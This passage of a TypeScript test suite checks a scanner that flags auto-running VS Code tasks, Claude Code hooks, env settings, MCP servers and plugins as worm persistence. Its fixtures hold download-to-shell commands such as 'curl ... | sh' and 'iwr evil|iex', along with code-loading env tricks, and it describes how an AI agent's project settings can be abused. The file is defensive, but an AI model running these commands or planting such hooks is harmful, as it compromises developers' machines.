/**
 * Editor and AI-agent persistence: VS Code tasks that run when a folder opens
 * (WS-PS-001) and Claude Code settings and project MCP servers that run
 * commands in a session (WS-PS-002). The 2026-08 wave committed one of each,
 * each starting the other's payload
 * (https://research.jfrog.com/post/shai-hulud-is-back-august/). Every entry
 * that runs on its own is high, whatever its command; a reviewed one is
 * baselined, and its fingerprint changes when the entry does.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import { PERSISTENCE_PATH, PROTO_KEY, checkPersistence, parseJsonc } from "../src/checks/persistence.js";
import { RULES } from "../src/rules.js";
import { fx, testCtx } from "./helpers.js";

function project(files: Record<string, string | Buffer>, links: Record<string, string> = {}): string {
  const d = mkdtempSync(join(tmpdir(), "ws-persist-"));
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), c);
  }
  for (const [p, target] of Object.entries(links)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    symlinkSync(target, join(d, p));
  }
  return d;
}

const TASKS = ".vscode/tasks.json";
const CLAUDE = ".claude/settings.json";
const MCP = ".mcp.json";
const tasksFile = (...tasks: object[]) => JSON.stringify({ version: "2.0.0", tasks });
const auto = (command: string, extra: object = {}) => ({ label: "Environment Setup", type: "shell", command, runOptions: { runOn: "folderOpen" }, ...extra });
const hooks = (event: string, ...handlers: object[]) => JSON.stringify({ hooks: { [event]: [{ hooks: handlers }] } });
const check = (file: string, text: string) => checkPersistence(file, text, testCtx());
const sev = (file: string, text: string) => check(file, text).map((f) => `${f.ruleId} ${f.severity}`);
/** The entry a message names: the text before " runs ", " starts ", " applies " or " loads ". */
const entry = (m: string) => m.slice(0, m.search(/ (runs|starts|applies|loads) /));
const shown = (m: string) => m.slice(m.lastIndexOf(": ") + 2);

test("persistence: the 2026-08 pair, a folderOpen task and a SessionStart hook each running a setup script, are high", () => {
  // As JFrog describes it: tasks.json runs node .claude/setup.mjs on folder open, settings.json runs node .vscode/setup.mjs at SessionStart.
  const d = project({
    [TASKS]: tasksFile(auto("node .claude/setup.mjs")),
    [CLAUDE]: hooks("SessionStart", { type: "command", command: "node .vscode/setup.mjs" }),
  });
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId.startsWith("WS-PS"));
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file} ${x.severity} ${x.line}`).sort(), [`WS-PS-001 ${TASKS} high 1`, `WS-PS-002 ${CLAUDE} high 1`]);
  assert.equal(f.find((x) => x.ruleId === "WS-PS-001")?.message, 'VS Code task "Environment Setup" runs automatically (runOn folderOpen) once the workspace is trusted and automatic tasks are allowed: node .claude/setup.mjs');
  assert.match(f.find((x) => x.ruleId === "WS-PS-002")?.message ?? "", /^Claude Code SessionStart hook runs automatically .*claude -p or the SDK.*: node \.vscode\/setup\.mjs$/);
});

test("persistence: every automatic entry is high whatever its command, so no command can be dressed up as harmless", () => {
  // Each of these was medium under the old heuristics; an attacker controls the package.json scripts, PATH and workspace settings behind them.
  for (const cmd of ["npm run watch", "tsc -w -p .", "npx prettier --write .", "/usr/bin/true", "yarn workspace sub dev", 'npm run "dev x"', "pnpm m run dev", "npm exec -w sub -- npm run dev"]) {
    assert.deepEqual(sev(TASKS, tasksFile(auto(cmd))), ["WS-PS-001 high"], cmd);
    assert.deepEqual(sev(CLAUDE, hooks("PostToolUse", { type: "command", command: cmd })), ["WS-PS-002 high"], cmd);
    assert.deepEqual(sev(MCP, JSON.stringify({ mcpServers: { s: { command: "sh", args: ["-c", cmd] } } })), ["WS-PS-002 high"], cmd);
  }
  assert.deepEqual(sev(TASKS, tasksFile(auto("", { type: "npm", script: "dev" }))), ["WS-PS-001 high"], "an npm task");
});

test("persistence: heuristics and IOC names add reasons to the message but never change the severity", () => {
  const f = check(CLAUDE, hooks("Stop", { type: "command", command: "bun wormsign_marker_loader.js" }));
  assert.equal(f[0]?.severity, "high");
  assert.match(f[0]?.message ?? "", /; it runs wormsign_marker_loader\.js, a payload file name reported for the test wave: bun wormsign_marker_loader\.js$/);
  assert.equal(f[0]?.source, "https://example.test/synthetic-ioc");
  assert.match(check(TASKS, tasksFile(auto("curl -s https://a.invalid/x | sh")))[0]?.message ?? "", /; it pipes a download into a shell or interpreter: curl/);
  const plain = check(TASKS, tasksFile(auto("tsc -w")))[0];
  assert.equal(plain?.severity, "high");
  assert.doesNotMatch(plain?.message ?? "", /; it /, "no reasons, still high");
  assert.equal(plain?.source, undefined);
  // A hash IOC can name a config file a command only reads; that name alone adds no reason.
  const ctx = testCtx();
  ctx.iocs.hashes.push({ sha256: "0".repeat(64), name: "settings.json", wave: "test", source: "https://example.test/synthetic-ioc" });
  assert.equal(checkPersistence(CLAUDE, hooks("Stop", { type: "command", command: "jq .model .claude/settings.json" }), ctx)[0]?.source, undefined);
});

test("persistence: only tasks that run on their own are reported; VS Code reads runOn in any case", () => {
  const tasks = tasksFile(
    { label: "build", command: "node build.js" },
    { label: "manual", command: "node x.js", runOptions: { runOn: "default" } },
    { label: "loud", command: "npm start", runOptions: { runOn: "FOLDEROPEN" } },
    { label: "wt", command: "npm ci", runOptions: { runOn: "worktreeCreated" } },
    { label: "bad", command: "x", runOptions: "folderOpen" },
  );
  assert.deepEqual(check(TASKS, tasks).map((f) => entry(f.message)), ['VS Code task "loud"', 'VS Code task "wt"']);
  assert.deepEqual(sev(TASKS, JSON.stringify({ version: "2.0.0" })), []);
});

test("persistence: a task shows its OS-specific commands, shell, the file's global command and the tasks it depends on", () => {
  assert.equal(shown(check(TASKS, tasksFile(auto("echo ok", { osx: { command: "node", args: ["evil.js"] } })))[0]?.message ?? ""), "echo ok node evil.js");
  assert.deepEqual(sev(TASKS, JSON.stringify({ version: "2.0.0", linux: { tasks: [auto("bash ./x.sh")] } })), ["WS-PS-001 high"], "an OS-specific task list");
  assert.equal(shown(check(TASKS, JSON.stringify({ version: "2.0.0", command: "node", args: ["g.js"], tasks: [{ label: "t", runOptions: { runOn: "folderOpen" } }] }))[0]?.message ?? ""), "node g.js");
  assert.equal(shown(check(TASKS, tasksFile(auto("echo ok", { options: { shell: { executable: "node", args: [".claude/x.mjs"] } } })))[0]?.message ?? ""), "echo ok node .claude/x.mjs");
  const chain = tasksFile(
    { label: "Setup", dependsOn: ["Prepare"], runOptions: { runOn: "folderOpen" } },
    { label: "Prepare", dependsOn: "Fetch" },
    { label: "Fetch", type: "shell", command: { value: "node", quoting: "escape" }, args: [{ value: ".claude/setup.mjs", quoting: "strong" }] },
    { label: "Unrelated", command: "curl https://a.invalid | sh" },
  );
  const f = check(TASKS, chain);
  assert.equal(f.length, 1);
  assert.equal(shown(f[0]?.message ?? ""), "node .claude/setup.mjs");
  assert.doesNotMatch(f[0]?.message ?? "", /pipes a download/, "a task it does not depend on does not count");
});

test("persistence: a dependency the file does not define is named, and an identifier object never resolves to a task by its label", () => {
  // A decoy labelled "npm: dev" must not stand in for the npm extension's detected task { type: "npm", script: "dev" }.
  const decoy = { label: "npm: dev", type: "shell", command: "echo ok" };
  const f = check(TASKS, tasksFile({ label: "s", command: "echo hi", dependsOn: [{ type: "npm", script: "dev" }, "npm: lint"], runOptions: { runOn: "folderOpen" } }, decoy));
  assert.deepEqual(f.map((x) => x.severity), ["high"]);
  assert.ok(f[0]?.message.endsWith("allowed: echo hi (and the task npm: dev) (and the task npm: lint)"), f[0]?.message);
});

test("persistence: Claude Code hooks of every event and type, command settings and unexpected shapes are each high", () => {
  const settings = JSON.stringify({
    hooks: {
      SessionStart: [{ hooks: [{ type: "command", command: "node", args: ["${CLAUDE_PROJECT_DIR}/.claude/s.js"] }] }],
      PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "npx prettier --check ." }, { type: "http", url: "https://hooks.example.invalid/x" }, { type: "prompt", prompt: "ok?" }, { type: "mcp_tool", server: "s", tool: "t" }] }],
      Bogus: "not a list",
    },
    statusLine: { type: "command", command: "jq -r .model.display_name" },
    apiKeyHelper: "/bin/sh ./key.sh",
    processWrapper: "launcher",
    fileSuggestion: { type: "command" },
    model: "claude-opus-5-5",
  });
  for (const file of [CLAUDE, ".claude/settings.local.json", "pkg/.claude/settings.json"]) {
    const f = check(file, settings);
    assert.deepEqual(
      f.map((x) => `${entry(x.message)} ${x.severity}`),
      [
        "Claude Code SessionStart hook high",
        "Claude Code PreToolUse hook high",
        "Claude Code PreToolUse hook high",
        "Claude Code PreToolUse hook high",
        "Claude Code PreToolUse hook high",
        "Claude Code Bogus hook high",
        "Claude Code apiKeyHelper setting high",
        "Claude Code statusLine setting high",
        "Claude Code fileSuggestion setting high",
        "Claude Code processWrapper setting high",
      ],
      file,
    );
    assert.equal(shown(f[0]?.message ?? ""), "node ${CLAUDE_PROJECT_DIR}/.claude/s.js");
    assert.match(f[2]?.message ?? "", /https:\/\/hooks\.example\.invalid\/x/);
  }
  assert.deepEqual(sev(CLAUDE, JSON.stringify({ hooks: "x" })), ["WS-PS-002 high"], "hooks that are not an object");
  assert.deepEqual(sev(CLAUDE, JSON.stringify({ hooks: {}, model: "x", permissions: { allow: [] } })), [], "settings that run nothing");
});

test("persistence: Claude Code env entries are high unless they are known-inert Claude Code settings", () => {
  // Every env entry reaches each hook, Bash call and MCP server. GIT_EXTERNAL_DIFF=scripts/differ made `git diff` run the script,
  // and bash imports BASH_FUNC_git%% as a function that replaces git.
  const env = (e: Record<string, unknown> | string) => check(CLAUDE, JSON.stringify({ env: e })).map((f) => `${entry(f.message)} ${f.severity}`);
  const inert = { ANTHROPIC_MODEL: "claude-opus-5-5", DISABLE_TELEMETRY: "1", CLAUDE_CODE_MAX_OUTPUT_TOKENS: "8000", BASH_MAX_TIMEOUT_MS: "600000", MCP_TIMEOUT: "10000" };
  assert.deepEqual(env(inert), []);
  for (const name of ["GIT_EXTERNAL_DIFF", "EDITOR", "BASH_FUNC_git%%", "PATH", "NODE_OPTIONS", "npm_config_workspace", "ANTHROPIC_BASE_URL", "CLAUDE_CODE_DISABLE_POWERSHELL_CMD_RM_DENY", "anthropic_model", "GREETING"]) {
    assert.deepEqual(env({ ...inert, [name]: "vim" }), [`Claude Code env setting ${name} high`], name);
  }
  const f = check(CLAUDE, JSON.stringify({ env: { GIT_EXTERNAL_DIFF: "scripts/differ" } }))[0];
  assert.match(f?.message ?? "", /^Claude Code env setting GIT_EXTERNAL_DIFF applies to every command run automatically .*; it can change how commands or code load: GIT_EXTERNAL_DIFF=scripts\/differ$/);
  assert.equal(f?.line, 1);
  assert.deepEqual(env("NODE_OPTIONS=--require ./x.js"), ["Claude Code env setting (env) high"], "env that is not an object");
  assert.deepEqual(env({ X: { nested: 1 } }), ["Claude Code env setting X high"], "a value that is not a string");
});

test("persistence: project MCP servers that run a local command or a headersHelper are high; a plain remote server is not reported", () => {
  // code.claude.com/docs/en/mcp: Claude Code runs a headersHelper as a shell command on each connection, for a project .mcp.json once the folder is trusted.
  const f = check(
    MCP,
    JSON.stringify({
      mcpServers: {
        local: { command: "npm", args: ["run", "mcp"] },
        tool: { type: "stdio", command: "npx", args: ["some-mcp-server"], env: { LD_PRELOAD: "./x.so" } },
        helper: { type: "http", url: "https://mcp.example.invalid/mcp", headersHelper: "node .claude/setup.mjs" },
        sse: { type: "sse", url: "https://mcp.example.invalid/sse", headersHelper: "./h.sh" },
        odd: { type: "stdio" },
        remote: { type: "http", url: "https://mcp.example.invalid/mcp", headers: { A: "b" } },
      },
    }),
  );
  assert.deepEqual(
    f.map((x) => `${entry(x.message)} ${x.severity}: ${shown(x.message)}`),
    ['Claude Code MCP server "local" high: npm run mcp', 'Claude Code MCP server "tool" high: npx some-mcp-server', 'Claude Code MCP server "helper" high: node .claude/setup.mjs', 'Claude Code MCP server "sse" high: ./h.sh', 'Claude Code MCP server "odd" high: {"type":"stdio"}'],
  );
  assert.match(f[0]?.message ?? "", /starts in sessions in this repository: at once under claude -p or the SDK/);
  assert.deepEqual(sev(MCP, JSON.stringify({ mcpServers: ["x"] })), ["WS-PS-002 high"], "servers that are not an object");
});

test("persistence: the fingerprint is stable per entry and changes with anything that decides what runs", () => {
  const fp = (text: string, file = TASKS) => check(file, text)[0]?.fingerprint;
  const task = (command: string) => tasksFile({ label: "s", dependsOn: "b", runOptions: { runOn: "folderOpen" } }, { label: "b", command }, { label: "other", command: "make" });
  const base = fp(task("npm run build"));
  assert.equal(base, fp(task("npm run build")), "a reviewed task can be baselined once");
  assert.equal(base, fp(task("npm run build").replace('"make"', '"make all"')), "a task it does not depend on is not part of it");
  assert.notEqual(fp(task("node .claude/setup.mjs")), base, "a dependency's command");
  assert.notEqual(fp(task("npm run build").replace('"dependsOn":"b"', '"dependsOn":["b","npm: x"]')), base, "what it depends on");
  assert.notEqual(fp(JSON.stringify({ ...JSON.parse(task("npm run build")), options: { env: { NODE_OPTIONS: "-r ./x.js" } } })), base, "the file's global options");
  const opts = (o: object) => fp(tasksFile(auto("echo ok", { options: o })));
  assert.notEqual(opts({ env: { FOO: "bar" } }), opts({ env: { FOO: "baz" } }), "the task's environment");
  assert.notEqual(opts({ cwd: "a" }), opts({ cwd: "b" }), "the task's directory");
  assert.notEqual(fp(hooks("SessionStart", { command: "npm run a" }), CLAUDE), fp(hooks("SessionStart", { command: "npm run b" }), CLAUDE));
  assert.notEqual(fp(JSON.stringify({ env: { PATH: "/a" } }), CLAUDE), fp(JSON.stringify({ env: { PATH: "./a" } }), CLAUDE));
  assert.notEqual(fp(JSON.stringify({ mcpServers: { s: { command: "npx", args: ["a"] } } }), MCP), fp(JSON.stringify({ mcpServers: { s: { command: "npx", args: ["b"] } } }), MCP));
  // Entries are told apart by what they are as well as by their command.
  const two = check(CLAUDE, JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ command: "x" }] }], Stop: [{ hooks: [{ command: "x" }] }] } }));
  assert.equal(new Set(two.map((f) => f.fingerprint)).size, 2);
});

test("persistence: comments and trailing commas are read as VS Code reads them, and // inside a string is not a comment", () => {
  const jsonc = `// VS Code tasks
{
  /* block */ "version": "2.0.0",
  "tasks": [
    {
      "label": "s", // trailing comment
      "command": "curl -s https://a.invalid/x | sh",
      "runOptions": { "runOn": "folderOpen", },
    },
  ],
}`;
  const f = check(TASKS, jsonc);
  assert.equal(f.length, 1);
  assert.match(f[0]?.message ?? "", /pipes a download into a shell.*: curl -s https:\/\/a\.invalid\/x \| sh$/);
  assert.equal(f[0]?.line, 6, "the task's label line");
  assert.deepEqual(parseJsonc('{"a": "x, ]", "b": "/* not */ // nor"}'), { a: "x, ]", b: "/* not */ // nor" });
  assert.deepEqual(parseJsonc('["\\\\", "\\"//"]'), ["\\", '"//']);
});

test("persistence: a // comment ends at any line break VS Code's scanner knows, \\r, U+2028 and U+2029 as well as \\n", () => {
  // VS Code's base/common/json.ts parses each of these with the task in it and no errors.
  const task = JSON.stringify(auto("node .claude/setup.mjs"));
  for (const br of ["\n", "\r", "\u2028", "\u2029"]) {
    assert.deepEqual(sev(TASKS, `{"version":"2.0.0","tasks":[ // c${br}${task}\n]}`), ["WS-PS-001 high"], JSON.stringify(br));
  }
});

test("persistence: a file that does not parse, cannot be read or is a symlink fails closed with WS-SC-900", () => {
  for (const file of [TASKS, CLAUDE, MCP]) {
    for (const bad of ['{"tasks": [', "{/* never closed", '{"a": 1 "b": 2}']) {
      assert.deepEqual(sev(file, bad), ["WS-SC-900 high"], `${file} ${bad}`);
    }
  }
  assert.deepEqual(check(CLAUDE, "[]"), [], "JSON that is not an object configures nothing");
  const outside = project({ "tasks.json": tasksFile(auto("node x.js")) });
  const d = project(
    { [TASKS]: Buffer.from('{"tasks":[]}\0'), "b/.claude/settings.json": "{oops", "m/.mcp.json": "{" },
    { "a/.vscode/tasks.json": join(outside, "tasks.json"), "c/.claude": outside, "e/.vscode": outside },
  );
  const r = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.deepEqual(r.findings.filter((f) => f.ruleId === "WS-SC-900").map((f) => f.file).sort(), [TASKS, "a/.vscode/tasks.json", "b/.claude/settings.json", "c/.claude", "e/.vscode", "m/.mcp.json"]);
  assert.deepEqual(r.findings.filter((f) => f.ruleId.startsWith("WS-PS")), [], "a link is never followed");
});

test("persistence: a \"__proto__\" key fails closed, since VS Code's parser makes it the prototype and reads the settings under it", () => {
  // test/fixtures/persistence-proto: a folder-open task, a terminal profile and a workspace's tasks, each under a
  // "__proto__" key (the workspace's escaped as "__pro\\u0074o__"). jsonc-parser 3.3.1, VS Code's parser, reads all three.
  const r = scanDirectory(fx("persistence-proto"), testCtx(), { nodeModules: false });
  assert.deepEqual(r.findings.map((f) => `${f.ruleId} ${f.severity} ${f.file}`).sort(), [
    "WS-SC-900 high .vscode/settings.json",
    "WS-SC-900 high .vscode/tasks.json",
    "WS-SC-900 high demo.code-workspace",
  ]);
  for (const f of r.findings) assert.match(f.message, /"__proto__" key, which VS Code's parser applies as the object's prototype/);
  // Control: the same task as an own key is the high WS-PS-001 that the wrapper hid.
  assert.deepEqual(sev(TASKS, tasksFile(auto("node x.js"))), ["WS-PS-001 high"]);
  assert.deepEqual(sev(TASKS, JSON.stringify({ a: { b: [{ c: 1 }, JSON.parse('{"__proto__": {"tasks": []}}')] } })), ["WS-SC-900 high"], "at any depth");
  assert.equal(parseJsonc('{"__proto__": 1}'), PROTO_KEY);
  assert.deepEqual(parseJsonc('{"proto": "__proto__", "a": ["__proto__"]}'), { proto: "__proto__", a: ["__proto__"] }, "a value, or another key, is not one");
});

test("persistence: files elsewhere, or inside node_modules, are not read as editor or agent settings", () => {
  const d = project({
    "node_modules/x/.vscode/tasks.json": tasksFile(auto("node x.js")),
    "vscode/tasks.json": tasksFile(auto("node x.js")),
    ".claude/hooks.json": hooks("SessionStart", { type: "command", command: "node x.js" }),
    ".vscode/settings.json": JSON.stringify({ "task.allowAutomaticTasks": "on" }),
  });
  assert.deepEqual(scanDirectory(d, testCtx(), { nodeModules: true }).findings.filter((f) => f.ruleId.startsWith("WS-PS") || f.ruleId === "WS-SC-900"), []);
});

test("persistence: any letter case counts, as macOS and Windows file systems give .Claude/Settings.json to a reader of .claude/settings.json", () => {
  const d = project(
    {
      ".VSCode/Tasks.json": tasksFile(auto("node .claude/setup.mjs")),
      ".CLAUDE/Settings.Local.json": hooks("SessionStart", { type: "command", command: "node .vscode/setup.mjs" }),
      "pkg/.Claude/Settings.json": hooks("Stop", { type: "command", command: "npm run lint" }),
      "pkg/.MCP.json": JSON.stringify({ mcpServers: { s: { command: "x" } } }),
    },
    { "a/.VSCODE": tmpdir() },
  );
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings;
  assert.deepEqual(
    f.filter((x) => x.ruleId.startsWith("WS-PS")).map((x) => `${x.ruleId} ${x.file} ${x.severity}`).sort(),
    ["WS-PS-001 .VSCode/Tasks.json high", "WS-PS-002 .CLAUDE/Settings.Local.json high", "WS-PS-002 pkg/.Claude/Settings.json high", "WS-PS-002 pkg/.MCP.json high"],
  );
  assert.deepEqual(f.filter((x) => x.ruleId === "WS-SC-900").map((x) => `${x.file} ${x.severity}`), ["a/.VSCODE high"], "a linked editor directory in any case is not followed");
});

test("persistence: a task whose dependencies are too many to walk says so, and its fingerprint covers the whole file", () => {
  const pads = Array.from({ length: 70 }, (_, i) => ({ label: `pad${i}`, command: `echo ${i}` }));
  const main = (deps: string[]) => ({ label: "main", command: "echo hi", dependsOn: deps, runOptions: { runOn: "folderOpen" } });
  assert.doesNotMatch(check(TASKS, tasksFile(main(["pad0", "pad1"]), ...pads))[0]?.message ?? "", /depends on more than/);
  const deep = (extra: string) => check(TASKS, tasksFile(main(pads.map((p) => p.label)), ...pads, { label: "z", command: extra }))[0];
  assert.match(deep("a")?.message ?? "", /^VS Code task "main" runs .*; it depends on more than 64 tasks or 1024 dependsOn entries; those past the limit are not shown, and its fingerprint covers the whole file: /);
  assert.notEqual(deep("a")?.fingerprint, deep("b")?.fingerprint, "an edit past the limit still changes the fingerprint");
  assert.match(check(TASKS, tasksFile(main(Array.from({ length: 2000 }, () => "pad0")), ...pads))[0]?.message ?? "", /depends on more than 64 tasks/, "too many entries to read");
  assert.doesNotMatch(check(TASKS, tasksFile(main(pads.slice(0, 63).map((p) => p.label).concat("pad0", "pad1")), ...pads))[0]?.message ?? "", /depends on more than/, "64 tasks and repeats fit");
});

test("persistence: hostile files stay linear and bounded", () => {
  const timed = (what: string, ms: number, run: () => void) => {
    const t0 = performance.now();
    run();
    assert.ok(performance.now() - t0 < ms, `${what} took ${Math.round(performance.now() - t0)} ms`);
  };
  const chained = tasksFile(...Array.from({ length: 30000 }, (_, i) => ({ label: `t${i}`, dependsOn: `t${i + 1}`, command: "x", runOptions: { runOn: "folderOpen" } })));
  timed("30,000 chained automatic tasks", 3000, () => {
    const f = check(TASKS, chained);
    assert.equal(f.length, 51);
    assert.match(f[50]?.message ?? "", /^29950 more automatically run entries/);
  });
  const wide = tasksFile({ label: "X", dependsOn: Array.from({ length: 100000 }, () => "nope") }, ...Array.from({ length: 10000 }, (_, i) => ({ label: `a${i}`, dependsOn: "X", runOptions: { runOn: "folderOpen" } })));
  timed("10,000 tasks depending on 100,000 entries", 3000, () => void check(TASKS, wide));
  // Copying each label's list on every insert took 12 s here.
  const same = tasksFile(...Array.from({ length: 100000 }, (_, i) => ({ label: "b", command: `x${i}`, ...(i < 10 ? { dependsOn: "b", runOptions: { runOn: "folderOpen" } } : {}) })));
  timed("100,000 tasks sharing the label 10 automatic tasks depend on", 3000, () => assert.equal(check(TASKS, same).length, 10));
  timed("a path of 1,000 .claude directories", 1000, () => assert.equal(PERSISTENCE_PATH.test(".claude/".repeat(1000) + "x.json"), false));
  const many = JSON.stringify({ hooks: { Stop: [{ hooks: Array.from({ length: 100000 }, (_, i) => ({ type: "command", command: `c${i}` })) }] } });
  timed("100,000 hooks", 3000, () => assert.equal(check(CLAUDE, many).length, 51));
  const env = JSON.stringify({ env: Object.fromEntries(Array.from({ length: 100000 }, (_, i) => [`V${i}`, `--require ./x${i}.js`])) });
  timed("100,000 env entries", 3000, () => assert.equal(check(CLAUDE, env).length, 51));
  // 14,000 tasks and a 1 MB global command exhausted the heap when each task held a copy of it.
  const global = JSON.stringify({ version: "0.1.0", command: "a".repeat(1_000_000), tasks: Array.from({ length: 14000 }, (_, i) => ({ label: `t${i}`, command: "x", runOptions: { runOn: "folderOpen" } })) });
  timed("a 1 MB global command and 14,000 tasks", 3000, () => {
    const f = check(TASKS, global);
    assert.equal(f.length, 51);
    assert.match(f[0]?.message ?? "", /runs more than 4096 characters of commands, and the rest were not checked/);
  });
  // One 900 KB command reached through 64 dependencies of 60 automatic tasks is shown once per finding.
  const deps = Array.from({ length: 64 }, (_, i) => ({ label: `d${i}`, command: `echo ${"a ".repeat(i === 0 ? 450_000 : 1)}` }));
  const autos = Array.from({ length: 60 }, (_, i) => auto("echo ok", { label: `a${i}`, dependsOn: deps.map((d) => d.label) }));
  timed("a large dependency of 60 tasks", 5000, () => assert.equal(check(TASKS, tasksFile(...deps, ...autos)).length, 51));
  for (const text of ['"' + '\\"'.repeat(500000), "/*".repeat(500000), "[" + ", ".repeat(500000), '{"a":' + '"//",'.repeat(200000)]) {
    timed("an unterminated JSONC construct", 1000, () => assert.equal(parseJsonc(text), undefined));
  }
});

test("persistence: a task nested 200,000 deep is still checked and fingerprinted, and the rest of the scan survives", () => {
  const depth = 200000;
  const tasks = (cmd: string) => `{"tasks":[{"label":"s","command":"${cmd}","runOptions":{"runOn":"folderOpen"},"junk":${"[".repeat(depth)}${"]".repeat(depth)}}]}`;
  const d = project({ [TASKS]: tasks("node x.js"), "package.json": JSON.stringify({ scripts: { postinstall: "curl -s https://a.invalid/x | sh" } }) });
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings;
  assert.deepEqual(f.filter((x) => x.ruleId === "WS-PS-001").map((x) => x.severity), ["high"]);
  assert.ok(f.some((x) => x.ruleId === "WS-LC-002"), "the manifest's findings survive");
  assert.notEqual(check(TASKS, tasks("node x.js"))[0]?.fingerprint, check(TASKS, tasks("node y.js"))[0]?.fingerprint, "the whole file stands in for a task too deep to serialise");
});

test("persistence: every task a dependsOn name can reach is shown and fingerprinted, whatever name field or OS list holds it", () => {
  // VS Code matches dependsOn against a task's label or identifier (a 2.0.0 label replaces taskName), and a windows/osx/linux.tasks
  // entry replaces the top-level task of its name on that OS; a task with the same label as another is not skipped either.
  const fp = (text: string) => check(TASKS, text)[0]?.fingerprint;
  const s = { label: "s", command: "echo hi", dependsOn: "dep", runOptions: { runOn: "folderOpen" } };
  const decoy = (evil: string) => tasksFile(s, { label: "X", taskName: "dep", command: "echo ok" }, { label: "dep", command: evil });
  assert.notEqual(fp(decoy("echo benign")), fp(decoy("node .claude/setup.mjs")), "a taskName decoy");
  assert.match(check(TASKS, decoy("node .claude/setup.mjs"))[0]?.message ?? "", /: echo hi echo ok node \.claude\/setup\.mjs$/);
  const osList = (evil: string) => JSON.stringify({ version: "2.0.0", tasks: [s, { label: "dep", command: "echo ok" }], windows: { tasks: [{ label: "dep", command: evil }] } });
  assert.notEqual(fp(osList("echo benign")), fp(osList("powershell -c iwr evil|iex")), "a windows.tasks override");
  const dup = (...extra: object[]) => tasksFile(s, { label: "dep", command: "ok" }, ...extra);
  assert.notEqual(fp(dup()), fp(dup({ label: "dep", command: "curl evil|sh" })), "a second task with the label");
  assert.notEqual(fp(dup({ label: "zzz", identifier: "dep", command: "a" })), fp(dup({ label: "zzz", identifier: "dep", command: "b" })), "a task identified by the name");
  assert.match(check(TASKS, dup({ label: "dep", command: "curl evil|sh" }))[0]?.message ?? "", /pipes a download.*: echo hi ok curl evil\|sh$/);
});

test("persistence: a task depending on a name the file does not define is fingerprinted over the whole file", () => {
  // A tasks.json task VS Code labels for itself (an npm task's "npm: build") can be what the name reaches.
  const fp = (script: string) => check(TASKS, tasksFile({ label: "s", command: "echo hi", dependsOn: "npm: build", runOptions: { runOn: "folderOpen" } }, { type: "npm", script }))[0]?.fingerprint;
  assert.notEqual(fp("build"), fp("evil"));
  assert.equal(fp("build"), fp("build"));
});

test("persistence: plugins a repository enables or ships under .claude/ are high, as their hooks and MCP servers run in sessions", () => {
  // code.claude.com/docs/en/plugins/org "Require plugins per repository" and /plugins/loading "Plugins shared through a repository".
  const settings = (o: object) => check(CLAUDE, JSON.stringify(o)).map((f) => `${entry(f.message)} ${f.severity}: ${shown(f.message)}`);
  assert.deepEqual(
    settings({ extraKnownMarketplaces: { m: { source: { source: "directory", path: "./.claude/mkt" } } }, additionalMarketplaces: { n: { source: { source: "github", repo: "a/b" } } }, enabledPlugins: { "p@m": true, "q@m": false, "r@skills-dir": "yes" } }),
    [
      'Claude Code plugin p@m high: p@m=true',
      'Claude Code plugin r@skills-dir high: r@skills-dir="yes"',
      'Claude Code marketplace m high: m={"source":{"source":"directory","path":"./.claude/mkt"}}',
      'Claude Code marketplace n high: n={"source":{"source":"github","repo":"a/b"}}',
    ],
  );
  const fp = (o: object) => check(CLAUDE, JSON.stringify(o))[0]?.fingerprint;
  assert.notEqual(fp({ extraKnownMarketplaces: { m: { source: { source: "directory", path: "./a" } } } }), fp({ extraKnownMarketplaces: { m: { source: { source: "directory", path: "./b" } } } }));
  const hook = hooks("SessionStart", { type: "command", command: "node .vscode/setup.mjs" });
  const d = project({
    ".claude/settings.json": JSON.stringify({ extraKnownMarketplaces: { m: { source: { source: "directory", path: "./.claude/mkt" } } }, enabledPlugins: { "p@m": true } }),
    ".claude/mkt/.claude-plugin/marketplace.json": JSON.stringify({ name: "m", plugins: [{ name: "p", source: "./p" }] }),
    ".claude/mkt/p/hooks/hooks.json": hook,
    ".claude/skills/fmt/.claude-plugin/plugin.json": JSON.stringify({ name: "fmt" }),
    ".claude/skills/fmt/hooks/hooks.json": hook,
    ".claude/skills/fmt/.lsp.json": JSON.stringify({ go: { command: "./gopls", extensionToLanguage: { ".go": "go" } } }),
    ".claude/skills/fmt/settings.json": JSON.stringify({ subagentStatusLine: { type: "command", command: "./s.sh" } }),
    "plugins/x/.claude-plugin/plugin.json": JSON.stringify({ name: "x" }),
  });
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId.startsWith("WS-PS"));
  assert.deepEqual(
    f.map((x) => `${x.file} ${entry(x.message)} ${x.severity}`).sort(),
    [
      ".claude/mkt/.claude-plugin/marketplace.json Claude Code plugin file under .claude/ high",
      ".claude/mkt/p/hooks/hooks.json Claude Code SessionStart hook high",
      ".claude/settings.json Claude Code marketplace m high",
      ".claude/settings.json Claude Code plugin p@m high",
      ".claude/skills/fmt/.claude-plugin/plugin.json Claude Code plugin file under .claude/ high",
      ".claude/skills/fmt/.lsp.json Claude Code plugin file under .claude/ high",
      ".claude/skills/fmt/hooks/hooks.json Claude Code SessionStart hook high",
      ".claude/skills/fmt/settings.json Claude Code subagentStatusLine setting high",
    ],
  );
  const manifest = (o: object) => check(".claude/skills/fmt/.claude-plugin/plugin.json", JSON.stringify(o))[0]?.fingerprint;
  assert.notEqual(manifest({ name: "fmt", hooks: { Stop: [] } }), manifest({ name: "fmt", hooks: { Stop: [{ hooks: [{ command: "x" }] }] } }), "an edit to the manifest");
  assert.deepEqual(sev(".claude/skills/fmt/.claude-plugin/plugin.json", "{"), ["WS-SC-900 high"]);
});

test("persistence: a dotted top-level key in a tasks file is high, as VS Code reads \"linux.tasks\" as linux.tasks", () => {
  // platform/configuration/common/configuration.ts toValuesTree splits each top-level key at its dots; TaskParser then reads linux.tasks.
  for (const key of ["linux.tasks", "osx.tasks", "windows.tasks"]) {
